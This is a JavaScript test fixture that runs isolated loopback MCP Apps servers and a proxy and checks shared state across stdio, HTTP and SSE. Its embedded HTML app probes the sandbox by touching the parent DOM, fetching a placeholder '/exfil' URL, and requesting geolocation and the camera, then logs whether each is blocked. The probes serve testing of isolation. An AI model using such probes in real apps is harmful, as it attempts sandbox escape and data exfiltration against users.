// [Input] Exact MCP packages, test-owned permission metadata vectors, and loopback transports.
// [Output] Isolated Apps server, distinct IM Node proxy, permission probes, and locality probes.
// [Pos] phase0-standard-apps-fixture; provider-free test code, never selected by production.
// [Sync] 2026-09-04: expose bounded positive/negative P0-04 permission metadata vectors.

import { randomUUID } from 'node:crypto';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';
import path from 'node:path';

const frontendRequire = createRequire(
  new URL('../../../../frontend/package.json', import.meta.url),
);
const loadFrontendModule = async (specifier) => (
  import(pathToFileURL(frontendRequire.resolve(specifier)).href)
);

const [
  { McpServer },
  { StreamableHTTPServerTransport },
  { StdioServerTransport },
  { SSEServerTransport },
  { createMcpExpressApp },
  { isInitializeRequest },
  { Client },
  { StreamableHTTPClientTransport },
  { StdioClientTransport },
  { SSEClientTransport },
  { registerAppResource, registerAppTool, RESOURCE_MIME_TYPE },
  z,
] = await Promise.all([
  loadFrontendModule('@modelcontextprotocol/sdk/server/mcp.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/server/streamableHttp.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/server/stdio.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/server/sse.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/server/express.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/types.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/client/index.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/client/streamableHttp.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/client/stdio.js'),
  loadFrontendModule('@modelcontextprotocol/sdk/client/sse.js'),
  loadFrontendModule('@modelcontextprotocol/ext-apps/server'),
  loadFrontendModule('zod/v4'),
]);

export const PHASE0_RESOURCE_URI = 'ui://phase0-standard-apps-fixture/view.html';
export const PHASE0_TOOL_NAME = 'phase0_show_shared_state';
export const PHASE0_CSP = Object.freeze({
  connectDomains: [],
  resourceDomains: [],
  frameDomains: [],
  baseUriDomains: [],
});
export const PHASE0_PERMISSIONS = Object.freeze({
  geolocation: {},
});

export const PHASE0_APP_HTML = String.raw`<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body>
  <main id="phase0-app" data-ready="false">
    <h2>Phase 0 isolated MCP App</h2>
    <output id="phase0-result">waiting</output>
  </main>
  <script>
    (() => {
      const main = document.getElementById('phase0-app');
      const output = document.getElementById('phase0-result');
      let requestId = 1;
      const send = (message) => parent.postMessage(message, '*');
      const log = (data) => send({
        jsonrpc: '2.0',
        method: 'notifications/message',
        params: { level: 'info', logger: 'phase0-app', data },
      });

      window.addEventListener('message', (event) => {
        const message = event.data;
        if (!message || message.jsonrpc !== '2.0') return;
        if (message.id === 1 && message.result) {
          send({ jsonrpc: '2.0', method: 'ui/notifications/initialized', params: {} });
          main.dataset.ready = 'true';
          log('initialized');
          const permissions = message.result.hostCapabilities?.sandbox?.permissions ?? {};
          log('host_permissions=' + Object.keys(permissions).sort().join(','));
          try {
            void window.top.document.body;
            log('parent_dom=accessible');
          } catch (error) {
            log('parent_dom=denied');
          }
          fetch('https://phase0-forbidden.invalid/exfil')
            .then(() => log('network=accessible'))
            .catch(() => log('network=blocked'));
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              () => log('geolocation=granted'),
              () => log('geolocation=denied'),
              { timeout: 500 },
            );
          } else {
            log('geolocation=unavailable');
          }
          if (navigator.mediaDevices?.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
              .then((stream) => {
                stream.getTracks().forEach((track) => track.stop());
                log('camera=granted');
              })
              .catch(() => log('camera=denied'));
          } else {
            log('camera=unavailable');
          }
          return;
        }
        if (message.method === 'ui/notifications/tool-result') {
          output.textContent = message.params?.structuredContent?.state ?? 'missing';
          log('tool_result=received');
          return;
        }
        if (message.method === 'ui/resource-teardown' && message.id !== undefined) {
          log('teardown=received');
          send({ jsonrpc: '2.0', id: message.id, result: {} });
        }
      });

      send({
        jsonrpc: '2.0',
        id: requestId,
        method: 'ui/initialize',
        params: {
          protocolVersion: '2026-01-26',
          appInfo: { name: 'phase0-isolated-app', version: '1.0.0' },
          appCapabilities: {},
        },
      });
    })();
  </script>
</body>
</html>`;

export function createPhase0State() {
  return {
    businessState: 'shared-state-v1',
    originatingToolCalls: 0,
    resourceReads: 0,
    methods: [],
    initializedSessions: [],
    upstreamMethods: [],
    upstreamInitializedSessions: [],
    proxyForwardedToolCalls: 0,
    proxyForwardedResourceReads: 0,
  };
}

export function expectedPhase0ToolResult(state = 'shared-state-v1') {
  return {
    content: [{ type: 'text', text: `Phase 0 state: ${state}` }],
    structuredContent: { state, source: 'shared-fixture-state' },
    _meta: {
      fixture: 'phase0-standard-apps-fixture',
      ui: { resourceUri: PHASE0_RESOURCE_URI },
    },
    isError: false,
  };
}

export function createPhase0McpServer(
  state,
  { resourcePermissions = PHASE0_PERMISSIONS, omitResourcePermissions = false } = {},
) {
  const server = new McpServer(
    { name: 'phase0-standard-apps-fixture', version: '1.0.0' },
    {
      capabilities: {
        tools: {},
        resources: {},
        extensions: {
          'io.modelcontextprotocol/ui': {
            mimeTypes: [RESOURCE_MIME_TYPE],
          },
        },
      },
    },
  );

  registerAppTool(
    server,
    PHASE0_TOOL_NAME,
    {
      title: 'Show shared Phase 0 state',
      description: 'Returns deterministic provider-free fixture state.',
      inputSchema: { request: z.string().optional() },
      _meta: {
        ui: {
          resourceUri: PHASE0_RESOURCE_URI,
          visibility: ['model', 'app'],
        },
      },
    },
    async () => {
      state.originatingToolCalls += 1;
      return expectedPhase0ToolResult(state.businessState);
    },
  );

  registerAppResource(
    server,
    'Phase 0 isolated App',
    PHASE0_RESOURCE_URI,
    {
      description: 'Provider-free MCP Apps HTML fixture.',
      _meta: { ui: {
        csp: PHASE0_CSP,
        ...(omitResourcePermissions ? {} : { permissions: resourcePermissions }),
      } },
    },
    async () => {
      state.resourceReads += 1;
      return {
        contents: [{
          uri: PHASE0_RESOURCE_URI,
          mimeType: RESOURCE_MIME_TYPE,
          text: PHASE0_APP_HTML,
          _meta: { ui: {
            csp: PHASE0_CSP,
            ...(omitResourcePermissions ? {} : { permissions: resourcePermissions }),
          } },
        }],
      };
    },
  );

  return server;
}

function createPhase0ProxyServer(state, upstreamClient) {
  const server = new McpServer(
    { name: 'phase0-im-node-proxy', version: '1.0.0' },
    {
      capabilities: {
        tools: {},
        resources: {},
        extensions: {
          'io.modelcontextprotocol/ui': {
            mimeTypes: [RESOURCE_MIME_TYPE],
          },
        },
      },
    },
  );

  registerAppTool(
    server,
    PHASE0_TOOL_NAME,
    {
      title: 'Show shared Phase 0 state',
      description: 'Forwards only the named test tool through the IM Node boundary.',
      inputSchema: { request: z.string().optional() },
      _meta: {
        ui: {
          resourceUri: PHASE0_RESOURCE_URI,
          visibility: ['model', 'app'],
        },
      },
    },
    async (arguments_) => {
      state.proxyForwardedToolCalls += 1;
      return upstreamClient.callTool({ name: PHASE0_TOOL_NAME, arguments: arguments_ });
    },
  );

  registerAppResource(
    server,
    'Phase 0 isolated App',
    PHASE0_RESOURCE_URI,
    {
      description: 'Forwards only the named test resource through the IM Node boundary.',
      _meta: {
        ui: {
          csp: PHASE0_CSP,
          permissions: PHASE0_PERMISSIONS,
        },
      },
    },
    async () => {
      state.proxyForwardedResourceReads += 1;
      return upstreamClient.readResource({ uri: PHASE0_RESOURCE_URI });
    },
  );

  return server;
}

function addCorsHeaders(request, response, allowedOrigin) {
  const origin = request.headers.origin;
  if (allowedOrigin && origin === allowedOrigin) {
    response.setHeader('Access-Control-Allow-Origin', origin);
    response.setHeader('Vary', 'Origin');
  }
  response.setHeader(
    'Access-Control-Allow-Headers',
    'content-type, accept, mcp-protocol-version, mcp-session-id, last-event-id',
  );
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  response.setHeader('Access-Control-Expose-Headers', 'mcp-session-id');
}

export async function startPhase0HttpFixture({
  allowedOrigin = null,
  host = '127.0.0.1',
  endpoint = '/phase0/im/mcp',
  upstreamEndpoint = '/phase0/upstream/mcp',
  state = createPhase0State(),
  resourcePermissions = PHASE0_PERMISSIONS,
  omitResourcePermissions = false,
} = {}) {
  const app = createMcpExpressApp();
  const imStreamableTransports = new Map();
  const upstreamStreamableTransports = new Map();
  const sseTransports = new Map();
  const servers = new Set();
  let upstreamClient;

  app.use((request, response, next) => {
    addCorsHeaders(request, response, allowedOrigin);
    if (request.method === 'OPTIONS') {
      response.status(204).end();
      return;
    }
    next();
  });

  const attachStreamableEndpoint = ({
    route,
    transports,
    methods,
    initializedSessions,
    createServer,
  }) => {
    app.all(route, async (request, response) => {
      try {
        if (request.body?.method) methods.push(request.body.method);
        const sessionId = request.headers['mcp-session-id'];
        let transport = sessionId ? transports.get(sessionId) : undefined;
        if (!transport && request.method === 'POST' && isInitializeRequest(request.body)) {
          transport = new StreamableHTTPServerTransport({
            sessionIdGenerator: () => randomUUID(),
            enableJsonResponse: true,
            onsessioninitialized: (newSessionId) => {
              initializedSessions.push(newSessionId);
              transports.set(newSessionId, transport);
            },
          });
          transport.onclose = () => {
            if (transport.sessionId) transports.delete(transport.sessionId);
          };
          const server = createServer();
          servers.add(server);
          await server.connect(transport);
        }
        if (!transport) {
          response.status(400).json({
            jsonrpc: '2.0',
            id: null,
            error: { code: -32000, message: 'Missing or invalid MCP session.' },
          });
          return;
        }
        await transport.handleRequest(request, response, request.body);
      } catch {
        if (!response.headersSent) {
          response.status(500).json({
            jsonrpc: '2.0',
            id: null,
            error: { code: -32603, message: 'Isolated fixture failure.' },
          });
        }
      }
    });
  };

  attachStreamableEndpoint({
    route: upstreamEndpoint,
    transports: upstreamStreamableTransports,
    methods: state.upstreamMethods,
    initializedSessions: state.upstreamInitializedSessions,
    createServer: () => createPhase0McpServer(state, {
      resourcePermissions,
      omitResourcePermissions,
    }),
  });
  attachStreamableEndpoint({
    route: endpoint,
    transports: imStreamableTransports,
    methods: state.methods,
    initializedSessions: state.initializedSessions,
    createServer: () => createPhase0ProxyServer(state, upstreamClient),
  });

  app.get('/phase0/upstream/sse', async (request, response) => {
    const transport = new SSEServerTransport('/phase0/upstream/messages', response);
    sseTransports.set(transport.sessionId, transport);
    response.on('close', () => sseTransports.delete(transport.sessionId));
    const server = createPhase0McpServer(state);
    servers.add(server);
    await server.connect(transport);
  });

  app.post('/phase0/upstream/messages', async (request, response) => {
    const transport = sseTransports.get(String(request.query.sessionId ?? ''));
    if (!transport) {
      response.status(400).send('Unknown isolated SSE session.');
      return;
    }
    await transport.handlePostMessage(request, response, request.body);
  });

  const listener = await new Promise((resolve, reject) => {
    const pending = app.listen(0, host, () => resolve(pending));
    pending.once('error', reject);
  });
  const address = listener.address();
  if (address === null || typeof address === 'string') {
    throw new Error('Could not resolve isolated fixture address.');
  }
  const baseUrl = `http://${host}:${address.port}`;
  const upstreamEndpointUrl = new URL(upstreamEndpoint, baseUrl).href;
  upstreamClient = createAppsClient('phase0-im-node-upstream-client');
  await upstreamClient.connect(
    new StreamableHTTPClientTransport(new URL(upstreamEndpointUrl)),
  );

  return {
    baseUrl,
    endpointUrl: new URL(endpoint, baseUrl).href,
    upstreamEndpointUrl,
    state,
    async close() {
      await upstreamClient.close();
      await Promise.allSettled([
        ...[...imStreamableTransports.values()].map((transport) => transport.close()),
        ...[...upstreamStreamableTransports.values()].map((transport) => transport.close()),
        ...[...sseTransports.values()].map((transport) => transport.close()),
        ...[...servers].map((server) => server.close()),
      ]);
      await new Promise((resolve, reject) => listener.close((error) => (
        error ? reject(error) : resolve()
      )));
    },
  };
}

function createAppsClient(name) {
  return new Client(
    { name, version: '1.0.0' },
    {
      capabilities: {
        extensions: {
          'io.modelcontextprotocol/ui': {
            mimeTypes: [RESOURCE_MIME_TYPE],
          },
        },
      },
    },
  );
}

async function readStateWithClient(client, transport) {
  await client.connect(transport);
  const tools = await client.listTools();
  const resource = await client.readResource({ uri: PHASE0_RESOURCE_URI });
  return {
    toolNames: tools.tools.map((tool) => tool.name),
    resourceUri: resource.contents[0]?.uri,
    resourceMimeType: resource.contents[0]?.mimeType,
    resourceStateIncluded: resource.contents[0]?.text?.includes('phase0-app') === true,
  };
}

async function probeStdio() {
  const client = createAppsClient('phase0-stdio-probe');
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [fileURLToPath(import.meta.url), '--serve-stdio'],
    stderr: 'pipe',
  });
  try {
    return await readStateWithClient(client, transport);
  } finally {
    await client.close();
  }
}

async function probeHttpAndSse() {
  const fixture = await startPhase0HttpFixture();
  try {
    const firstClient = createAppsClient('phase0-http-probe-a');
    const first = await readStateWithClient(
      firstClient,
      new StreamableHTTPClientTransport(new URL(fixture.endpointUrl)),
    );
    await firstClient.close();

    const secondClient = createAppsClient('phase0-http-probe-b');
    const second = await readStateWithClient(
      secondClient,
      new StreamableHTTPClientTransport(new URL(fixture.endpointUrl)),
    );
    await secondClient.close();

    const freshUpstreamClient = createAppsClient('phase0-fresh-node-upstream-probe');
    const freshUpstream = await readStateWithClient(
      freshUpstreamClient,
      new StreamableHTTPClientTransport(new URL(fixture.upstreamEndpointUrl)),
    );
    await freshUpstreamClient.close();

    const sseClient = createAppsClient('phase0-sse-probe');
    const sse = await readStateWithClient(
      sseClient,
      new SSEClientTransport(new URL('/phase0/upstream/sse', fixture.baseUrl)),
    );
    await sseClient.close();

    return {
      localhostStreamableHttp: first,
      freshSessionStreamableHttp: second,
      freshNodeUpstreamSession: freshUpstream,
      nodeReachableLegacySse: sse,
      sharedStateVisibleAcrossSessions: (
        first.resourceUri === second.resourceUri
        && second.resourceUri === freshUpstream.resourceUri
        && first.resourceStateIncluded
        && second.resourceStateIncluded
        && freshUpstream.resourceStateIncluded
        && fixture.state.initializedSessions.length >= 2
        && fixture.state.upstreamInitializedSessions.length >= 2
        && fixture.state.proxyForwardedResourceReads >= 2
      ),
    };
  } finally {
    await fixture.close();
  }
}

async function serveStdio() {
  const state = createPhase0State();
  const server = createPhase0McpServer(state);
  const transport = new StdioServerTransport();
  await server.connect(transport);
}

async function probeAll() {
  const [stdio, network] = await Promise.all([probeStdio(), probeHttpAndSse()]);
  process.stdout.write(`${JSON.stringify({
    nodeVersion: process.version,
    stdio,
    ...network,
    userDeviceStdio: 'excluded-node-cannot-start-process-on-user-device',
  })}\n`);
}

const invokedPath = process.argv[1] ? path.resolve(process.argv[1]) : null;
if (invokedPath === fileURLToPath(import.meta.url)) {
  if (process.argv.includes('--serve-stdio')) {
    await serveStdio();
  } else if (process.argv.includes('--probe-all')) {
    await probeAll();
  }
}
